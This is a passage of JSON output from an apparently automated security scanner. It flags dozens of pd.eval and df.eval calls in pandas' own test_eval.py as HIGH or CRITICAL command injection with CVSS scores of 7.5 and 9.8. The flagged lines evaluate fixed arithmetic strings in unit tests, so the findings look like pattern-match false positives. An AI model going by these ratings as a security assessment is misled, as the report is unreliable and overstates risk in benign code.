            "context": "        # GH 25823\n        event = Series({\"a\": \"hello\"})\n        assert pd.eval(f\"{event.str.match('hello').a}\")\n        assert pd.eval(f\"{event.str.match('hello').a and event.str.match('hello').a}\")\n\n\n# -------------------------------------",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 758,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(s, engine=engine, parser=parser)",
            "context": "        df = DataFrame(np.random.default_rng(2).standard_normal((5, 3)), dtype=dtype)\n        left, right = left_right\n        s = f\"{left} {op} {right}\"\n        res = pd.eval(s, engine=engine, parser=parser)\n        if dtype == \"complex64\" and engine == \"numexpr\":\n            mark = pytest.mark.xfail(\n                reason=\"numexpr issue with complex that are upcast \"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 768,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "tm.assert_frame_equal(res, eval(s), check_exact=False)",
            "context": "            request.applymarker(mark)\n        assert df.values.dtype == dtype\n        assert res.values.dtype == dtype\n        tm.assert_frame_equal(res, eval(s), check_exact=False)\n\n\n# -------------------------------------",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 790,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(s, engine=engine, parser=parser)",
            "context": "    def test_align_nested_unary_op(self, engine, parser):\n        s = \"df * ~2\"\n        df = DataFrame(np.random.default_rng(2).standard_normal((5, 3)))\n        res = pd.eval(s, engine=engine, parser=parser)\n        tm.assert_frame_equal(res, df * ~2)\n\n    @pytest.mark.filterwarnings(\"always::RuntimeWarning\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 813,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"df + df2\", engine=engine, parser=parser)",
            "context": "        # only warns if not monotonic and not sortable\n        if should_warn(df.index, df2.index):\n            with tm.assert_produces_warning(RuntimeWarning):\n                res = pd.eval(\"df + df2\", engine=engine, parser=parser)\n        else:\n            res = pd.eval(\"df + df2\", engine=engine, parser=parser)\n        tm.assert_frame_equal(res, df + df2)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 815,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"df + df2\", engine=engine, parser=parser)",
            "context": "            with tm.assert_produces_warning(RuntimeWarning):\n                res = pd.eval(\"df + df2\", engine=engine, parser=parser)\n        else:\n            res = pd.eval(\"df + df2\", engine=engine, parser=parser)\n        tm.assert_frame_equal(res, df + df2)\n\n    @pytest.mark.parametrize(\"r_idx_type\", lhs_index_types)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 828,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"df < 2\", engine=engine, parser=parser)",
            "context": "            index=idx_func_dict[r_idx_type](10),\n            columns=idx_func_dict[c_idx_type](10),\n        )\n        res = pd.eval(\"df < 2\", engine=engine, parser=parser)\n        tm.assert_frame_equal(res, df < 2)\n\n        df3 = DataFrame(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 836,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"df < df3\", engine=engine, parser=parser)",
            "context": "            index=df.index,\n            columns=df.columns,\n        )\n        res = pd.eval(\"df < df3\", engine=engine, parser=parser)\n        tm.assert_frame_equal(res, df < df3)\n\n    @pytest.mark.filterwarnings(\"ignore::RuntimeWarning\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 864,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"df + df2 + df3\", engine=engine, parser=parser)",
            "context": "        )\n        if should_warn(df.index, df2.index, df3.index):\n            with tm.assert_produces_warning(RuntimeWarning):\n                res = pd.eval(\"df + df2 + df3\", engine=engine, parser=parser)\n        else:\n            res = pd.eval(\"df + df2 + df3\", engine=engine, parser=parser)\n        tm.assert_frame_equal(res, df + df2 + df3)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 866,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"df + df2 + df3\", engine=engine, parser=parser)",
            "context": "            with tm.assert_produces_warning(RuntimeWarning):\n                res = pd.eval(\"df + df2 + df3\", engine=engine, parser=parser)\n        else:\n            res = pd.eval(\"df + df2 + df3\", engine=engine, parser=parser)\n        tm.assert_frame_equal(res, df + df2 + df3)\n\n    @pytest.mark.filterwarnings(\"ignore::RuntimeWarning\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 886,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"df + s\", engine=engine, parser=parser)",
            "context": "\n        if should_warn(df.index, s.index):\n            with tm.assert_produces_warning(RuntimeWarning):\n                res = pd.eval(\"df + s\", engine=engine, parser=parser)\n        else:\n            res = pd.eval(\"df + s\", engine=engine, parser=parser)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 888,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"df + s\", engine=engine, parser=parser)",
            "context": "            with tm.assert_produces_warning(RuntimeWarning):\n                res = pd.eval(\"df + s\", engine=engine, parser=parser)\n        else:\n            res = pd.eval(\"df + s\", engine=engine, parser=parser)\n\n        if r_idx_type == \"dt\" or c_idx_type == \"dt\":\n            expected = df.add(s) if engine == \"numexpr\" else df + s",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 927,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"s + df\", engine=engine, parser=parser)",
            "context": "        s = Series(np.random.default_rng(2).standard_normal(5), index[:5])\n        if should_warn(s.index, df.index):\n            with tm.assert_produces_warning(RuntimeWarning):\n                res = pd.eval(\"s + df\", engine=engine, parser=parser)\n        else:\n            res = pd.eval(\"s + df\", engine=engine, parser=parser)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 929,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"s + df\", engine=engine, parser=parser)",
            "context": "            with tm.assert_produces_warning(RuntimeWarning):\n                res = pd.eval(\"s + df\", engine=engine, parser=parser)\n        else:\n            res = pd.eval(\"s + df\", engine=engine, parser=parser)\n\n        if r_idx_type == \"dt\" or c_idx_type == \"dt\":\n            expected = df.add(s) if engine == \"numexpr\" else s + df",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 957,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "a = pd.eval(lhs, engine=engine, parser=parser)",
            "context": "        rhs = f\"df {op} s\"\n        if should_warn(df.index, s.index):\n            with tm.assert_produces_warning(RuntimeWarning):\n                a = pd.eval(lhs, engine=engine, parser=parser)\n            with tm.assert_produces_warning(RuntimeWarning):\n                b = pd.eval(rhs, engine=engine, parser=parser)\n        else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 959,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "b = pd.eval(rhs, engine=engine, parser=parser)",
            "context": "            with tm.assert_produces_warning(RuntimeWarning):\n                a = pd.eval(lhs, engine=engine, parser=parser)\n            with tm.assert_produces_warning(RuntimeWarning):\n                b = pd.eval(rhs, engine=engine, parser=parser)\n        else:\n            a = pd.eval(lhs, engine=engine, parser=parser)\n            b = pd.eval(rhs, engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 961,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "a = pd.eval(lhs, engine=engine, parser=parser)",
            "context": "            with tm.assert_produces_warning(RuntimeWarning):\n                b = pd.eval(rhs, engine=engine, parser=parser)\n        else:\n            a = pd.eval(lhs, engine=engine, parser=parser)\n            b = pd.eval(rhs, engine=engine, parser=parser)\n\n        if r_idx_type != \"dt\" and c_idx_type != \"dt\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 962,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "b = pd.eval(rhs, engine=engine, parser=parser)",
            "context": "                b = pd.eval(rhs, engine=engine, parser=parser)\n        else:\n            a = pd.eval(lhs, engine=engine, parser=parser)\n            b = pd.eval(rhs, engine=engine, parser=parser)\n\n        if r_idx_type != \"dt\" and c_idx_type != \"dt\":\n            if engine == \"numexpr\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1010,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"df2 + ser + df\", engine=engine, parser=parser)",
            "context": "\n        if should_warn(df2.index, ser.index, df.index):\n            with tm.assert_produces_warning(RuntimeWarning):\n                res = pd.eval(\"df2 + ser + df\", engine=engine, parser=parser)\n        else:\n            res = pd.eval(\"df2 + ser + df\", engine=engine, parser=parser)\n        assert res.shape == expected.shape",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1012,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"df2 + ser + df\", engine=engine, parser=parser)",
            "context": "            with tm.assert_produces_warning(RuntimeWarning):\n                res = pd.eval(\"df2 + ser + df\", engine=engine, parser=parser)\n        else:\n            res = pd.eval(\"df2 + ser + df\", engine=engine, parser=parser)\n        assert res.shape == expected.shape\n        tm.assert_frame_equal(res, expected)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1025,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"df + s\", engine=engine, parser=parser)",
            "context": "            seen = False\n\n        with tm.assert_produces_warning(seen):\n            pd.eval(\"df + s\", engine=engine, parser=parser)\n\n        s = Series(np.random.default_rng(2).standard_normal(1000))\n        with tm.assert_produces_warning(False):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1029,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"df + s\", engine=engine, parser=parser)",
            "context": "\n        s = Series(np.random.default_rng(2).standard_normal(1000))\n        with tm.assert_produces_warning(False):\n            pd.eval(\"df + s\", engine=engine, parser=parser)\n\n        df = DataFrame(np.random.default_rng(2).standard_normal((10, 10000)))\n        s = Series(np.random.default_rng(2).standard_normal(10000))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1034,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"df + s\", engine=engine, parser=parser)",
            "context": "        df = DataFrame(np.random.default_rng(2).standard_normal((10, 10000)))\n        s = Series(np.random.default_rng(2).standard_normal(10000))\n        with tm.assert_produces_warning(False):\n            pd.eval(\"df + s\", engine=engine, parser=parser)\n\n        df = DataFrame(np.random.default_rng(2).standard_normal((10, 10)))\n        s = Series(np.random.default_rng(2).standard_normal(10000))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1047,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"df + s\", engine=engine, parser=parser)",
            "context": "            wrn = False\n\n        with tm.assert_produces_warning(wrn) as w:\n            pd.eval(\"df + s\", engine=engine, parser=parser)\n\n            if not is_python_engine:\n                assert len(w) == 1",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1066,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(self, *args, **kwargs):",
            "context": "\n\nclass TestOperations:\n    def eval(self, *args, **kwargs):\n        kwargs[\"level\"] = kwargs.pop(\"level\", 0) + 1\n        return pd.eval(*args, **kwargs)\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1068,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return pd.eval(*args, **kwargs)",
            "context": "class TestOperations:\n    def eval(self, *args, **kwargs):\n        kwargs[\"level\"] = kwargs.pop(\"level\", 0) + 1\n        return pd.eval(*args, **kwargs)\n\n    def test_simple_arith_ops(self, engine, parser):\n        exclude_arith = []",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1091,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(ex, engine=engine, parser=parser)",
            "context": "            if op in (\"in\", \"not in\"):\n                msg = \"argument of type 'int' is not iterable\"\n                with pytest.raises(TypeError, match=msg):\n                    pd.eval(ex, engine=engine, parser=parser)\n            else:\n                expec = _eval_single_bin(1, op, 1, engine)\n                x = self.eval(ex, engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1094,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "x = self.eval(ex, engine=engine, parser=parser)",
            "context": "                    pd.eval(ex, engine=engine, parser=parser)\n            else:\n                expec = _eval_single_bin(1, op, 1, engine)\n                x = self.eval(ex, engine=engine, parser=parser)\n                assert x == expec\n\n                expec = _eval_single_bin(x, op, 1, engine)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1098,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "y = self.eval(ex2, local_dict={\"x\": x}, engine=engine, parser=parser)",
            "context": "                assert x == expec\n\n                expec = _eval_single_bin(x, op, 1, engine)\n                y = self.eval(ex2, local_dict={\"x\": x}, engine=engine, parser=parser)\n                assert y == expec\n\n                expec = _eval_single_bin(1, op, x + 1, engine)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1102,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "y = self.eval(ex3, local_dict={\"x\": x}, engine=engine, parser=parser)",
            "context": "                assert y == expec\n\n                expec = _eval_single_bin(1, op, x + 1, engine)\n                y = self.eval(ex3, local_dict={\"x\": x}, engine=engine, parser=parser)\n                assert y == expec\n\n    @pytest.mark.parametrize(\"rhs\", [True, False])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1114,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.eval(ex)",
            "context": "        if parser == \"python\" and op in [\"and\", \"or\"]:\n            msg = \"'BoolOp' nodes are not implemented\"\n            with pytest.raises(NotImplementedError, match=msg):\n                self.eval(ex)\n            return\n\n        res = self.eval(ex)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1117,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = self.eval(ex)",
            "context": "                self.eval(ex)\n            return\n\n        res = self.eval(ex)\n        exp = eval(ex)\n        assert res == exp\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1118,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exp = eval(ex)",
            "context": "            return\n\n        res = self.eval(ex)\n        exp = eval(ex)\n        assert res == exp\n\n    @pytest.mark.parametrize(\"rhs\", [True, False])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1130,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.eval(ex)",
            "context": "        if parser == \"python\" and op in [\"and\", \"or\"]:\n            msg = \"'BoolOp' nodes are not implemented\"\n            with pytest.raises(NotImplementedError, match=msg):\n                self.eval(ex)\n            return\n\n        res = self.eval(ex)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1133,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = self.eval(ex)",
            "context": "                self.eval(ex)\n            return\n\n        res = self.eval(ex)\n        exp = eval(ex)\n        assert res == exp\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1134,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exp = eval(ex)",
            "context": "            return\n\n        res = self.eval(ex)\n        exp = eval(ex)\n        assert res == exp\n\n    def test_4d_ndarray_fails(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1142,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.eval(\"x + y\", local_dict={\"x\": x, \"y\": y})",
            "context": "        y = Series(np.random.default_rng(2).standard_normal(10))\n        msg = \"N-dimensional objects, where N > 2, are not supported with eval\"\n        with pytest.raises(NotImplementedError, match=msg):\n            self.eval(\"x + y\", local_dict={\"x\": x, \"y\": y})\n\n    def test_constant(self):\n        x = self.eval(\"1\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1145,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "x = self.eval(\"1\")",
            "context": "            self.eval(\"x + y\", local_dict={\"x\": x, \"y\": y})\n\n    def test_constant(self):\n        x = self.eval(\"1\")\n        assert x == 1\n\n    def test_single_variable(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1150,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df2 = self.eval(\"df\", local_dict={\"df\": df})",
            "context": "\n    def test_single_variable(self):\n        df = DataFrame(np.random.default_rng(2).standard_normal((10, 2)))\n        df2 = self.eval(\"df\", local_dict={\"df\": df})\n        tm.assert_frame_equal(df, df2)\n\n    def test_failing_subscript_with_name_error(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1156,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.eval(\"df[x > 2] > 2\")",
            "context": "    def test_failing_subscript_with_name_error(self):\n        df = DataFrame(np.random.default_rng(2).standard_normal((5, 3)))  # noqa: F841\n        with pytest.raises(NameError, match=\"name 'x' is not defined\"):\n            self.eval(\"df[x > 2] > 2\")\n\n    def test_lhs_expression_subscript(self):\n        df = DataFrame(np.random.default_rng(2).standard_normal((5, 3)))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1160,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = self.eval(\"(df + 1)[df > 2]\", local_dict={\"df\": df})",
            "context": "\n    def test_lhs_expression_subscript(self):\n        df = DataFrame(np.random.default_rng(2).standard_normal((5, 3)))\n        result = self.eval(\"(df + 1)[df > 2]\", local_dict={\"df\": df})\n        expected = (df + 1)[df > 2]\n        tm.assert_frame_equal(result, expected)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1177,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "tm.assert_series_equal(expec, self.eval(e, local_dict={\"df\": df}))",
            "context": "        exprs = expr1, expr2, expr3\n        expecs = expec1, expec2, expec3\n        for e, expec in zip(exprs, expecs):\n            tm.assert_series_equal(expec, self.eval(e, local_dict={\"df\": df}))\n\n    def test_assignment_fails(self):\n        df = DataFrame(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1187,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.eval(expr1, local_dict={\"df\": df, \"df2\": df2})",
            "context": "        expr1 = \"df = df2\"\n        msg = \"cannot assign without a target object\"\n        with pytest.raises(ValueError, match=msg):\n            self.eval(expr1, local_dict={\"df\": df, \"df2\": df2})\n\n    def test_assignment_column_multiple_raise(self):\n        df = DataFrame(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1195,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"d c = a + b\")",
            "context": "        )\n        # multiple assignees\n        with pytest.raises(SyntaxError, match=\"invalid syntax\"):\n            df.eval(\"d c = a + b\")\n\n    def test_assignment_column_invalid_assign(self):\n        df = DataFrame(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1204,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"d,c = a + b\")",
            "context": "        # invalid assignees\n        msg = \"left hand side of an assignment must be a single name\"\n        with pytest.raises(SyntaxError, match=msg):\n            df.eval(\"d,c = a + b\")\n\n    def test_assignment_column_invalid_assign_function_call(self):\n        df = DataFrame(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1212,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval('Timestamp(\"20131001\") = a + b')",
            "context": "        )\n        msg = \"cannot assign to function call\"\n        with pytest.raises(SyntaxError, match=msg):\n            df.eval('Timestamp(\"20131001\") = a + b')\n\n    def test_assignment_single_assign_existing(self):\n        df = DataFrame(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1221,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"a = a + b\", inplace=True)",
            "context": "        # single assignment - existing variable\n        expected = df.copy()\n        expected[\"a\"] = expected[\"a\"] + expected[\"b\"]\n        df.eval(\"a = a + b\", inplace=True)\n        tm.assert_frame_equal(df, expected)\n\n    def test_assignment_single_assign_new(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1231,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"c = a + b\", inplace=True)",
            "context": "        # single assignment - new variable\n        expected = df.copy()\n        expected[\"c\"] = expected[\"a\"] + expected[\"b\"]\n        df.eval(\"c = a + b\", inplace=True)\n        tm.assert_frame_equal(df, expected)\n\n    def test_assignment_single_assign_local_overlap(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1240,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"a = 1 + b\", inplace=True)",
            "context": "        )\n        df = df.copy()\n        a = 1  # noqa: F841\n        df.eval(\"a = 1 + b\", inplace=True)\n\n        expected = df.copy()\n        expected[\"a\"] = 1 + expected[\"b\"]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1253,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"a = a + b\", inplace=True)",
            "context": "\n        a = 1  # noqa: F841\n        old_a = df.a.copy()\n        df.eval(\"a = a + b\", inplace=True)\n        result = old_a + df.b\n        tm.assert_series_equal(result, df.a, check_names=False)\n        assert result.name is None",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1263,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"c = a + b\", inplace=True)",
            "context": "            np.random.default_rng(2).standard_normal((5, 2)), columns=list(\"ab\")\n        )\n        # multiple assignment\n        df.eval(\"c = a + b\", inplace=True)\n        msg = \"can only assign a single expression\"\n        with pytest.raises(SyntaxError, match=msg):\n            df.eval(\"c = a = b\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1266,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"c = a = b\")",
            "context": "        df.eval(\"c = a + b\", inplace=True)\n        msg = \"can only assign a single expression\"\n        with pytest.raises(SyntaxError, match=msg):\n            df.eval(\"c = a = b\")\n\n    def test_assignment_explicit(self):\n        df = DataFrame(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1273,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.eval(\"c = df.a + df.b\", local_dict={\"df\": df}, target=df, inplace=True)",
            "context": "            np.random.default_rng(2).standard_normal((5, 2)), columns=list(\"ab\")\n        )\n        # explicit targets\n        self.eval(\"c = df.a + df.b\", local_dict={\"df\": df}, target=df, inplace=True)\n        expected = df.copy()\n        expected[\"c\"] = expected[\"a\"] + expected[\"b\"]\n        tm.assert_frame_equal(df, expected)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1281,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"a in [11, -32]\")",
            "context": "    def test_column_in(self):\n        # GH 11235\n        df = DataFrame({\"a\": [11], \"b\": [-32]})\n        result = df.eval(\"a in [11, -32]\")\n        expected = Series([True])\n        # TODO: 2022-01-29: Name check failed with numexpr 2.7.3 in CI\n        # but cannot reproduce locally",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1294,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "actual = df.eval(\"c = a + b\", inplace=False)",
            "context": "            np.random.default_rng(2).standard_normal((5, 2)), columns=list(\"ab\")\n        )\n\n        actual = df.eval(\"c = a + b\", inplace=False)\n        assert actual is not None\n\n        expected = df.copy()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1308,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "answer = df.eval(",
